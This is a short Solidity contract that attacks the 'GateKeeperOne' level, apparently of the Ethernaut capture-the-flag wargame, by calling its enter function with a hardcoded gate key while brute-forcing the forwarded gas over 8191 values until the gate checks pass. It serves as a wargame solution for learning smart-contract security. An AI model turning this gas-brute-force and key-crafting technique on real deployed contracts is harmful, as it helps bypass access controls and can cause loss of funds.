// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKepeerOne {
    function enter(bytes8 _gateKey) external returns (bool);
}


contract gatekepeeroneattack { 
    IGateKepeerOne public targetContract; 

    constructor(address _gatekepeer) {
        targetContract = IGateKepeerOne (_gatekepeer);
    }

    function attack() public {
    bytes8 gateKey = 0x000000010000044d;
    
    for (uint256 i = 0; i < 8191; i++) {
        (bool success,) = address(targetContract).call{gas: 8191 * 3 + i}(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        if (success) break;
    }
}
}
